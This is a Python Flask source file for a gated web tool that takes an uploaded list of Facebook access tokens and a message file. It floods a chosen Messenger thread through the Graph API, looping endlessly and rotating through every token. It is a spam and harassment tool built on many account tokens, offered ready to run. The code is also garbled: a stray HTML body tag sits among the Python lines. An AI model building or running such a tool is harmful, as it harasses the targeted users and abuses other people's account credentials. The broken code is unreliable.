from flask import Flask, request, redirect, render_template, session, url_for
from config import APPROVED_KEYS
from threading import Thread, Event
import requests
import time
import os

app = Flask(__name__)
app.secret_key = 'very-secret-key'

stop_event = Event()
threads = []
<body style="background-image: url('{{ url_for('static', filename='backgroup.jpg') }}'); background-size: cover; background-repeat: no-repeat; background-position: center; color: white; text-align: center;">
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        key = request.form.get('access_key')
        if key in APPROVED_KEYS:
            session['approved'] = True
            session['user'] = APPROVED_KEYS[key]
            return redirect('/main')
        else:
            return render_template('login.html', error="Access key invalid.")
    return render_template('login.html')

@app.route('/main', methods=['GET', 'POST'])
def main_page():
    if not session.get('approved'):
        return redirect('/')

    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))            
            thread.start()

    return render_template('main.html')

@app.route('/stop', methods=['POST'])
def stop_sending():
    stop_event.set()
    return 'Message sending stopped.'

def send_messages(access_tokens, thread_id, mn, time_interval, messages):
    headers = {
        'User-Agent': 'Mozilla/5.0'
    }
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                print(f"Status: {response.status_code}, Message: {message}")
                time.sleep(time_interval)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
